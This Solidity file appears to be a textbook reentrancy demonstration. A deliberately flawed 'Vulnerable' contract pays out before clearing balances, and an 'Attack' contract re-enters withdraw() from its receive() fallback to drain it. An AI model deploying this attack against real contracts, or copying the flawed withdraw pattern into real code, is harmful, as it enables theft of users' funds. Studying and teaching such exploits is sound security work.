// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent);

        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    function attack() public payable {
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }
}